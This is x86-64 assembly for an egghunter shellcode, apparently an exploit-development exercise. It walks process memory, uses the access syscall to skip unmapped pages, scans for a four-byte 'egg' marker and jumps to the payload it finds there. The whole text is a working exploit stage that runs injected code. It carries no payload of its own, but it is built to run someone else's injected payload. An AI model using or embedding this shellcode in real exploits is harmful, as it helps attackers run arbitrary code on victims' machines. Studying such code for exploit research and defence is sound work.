global _start
section .text

syscalls.access equ 0x15

EFAULT.lowerbyte equ 0xf2

egg_plus_one equ 0x90909091

_start:
        xor rsi,rsi
        mov rdi,rsi ; start at 0x0

goto_next_page:
        or di,0xfff
        inc rdi

try_next_4_bytes:
        push syscalls.access
        pop rax
        syscall
        cmp al,EFAULT.lowerbyte
        jz goto_next_page
        
        egg_search:
        ; can access page, let's search for the egg
        mov eax,egg_plus_one
        dec al
        scasd
        jnz try_next_4_bytes
        
        payload_execution:
        ; we found the egg, let's jump to our payload!
        jmp rdi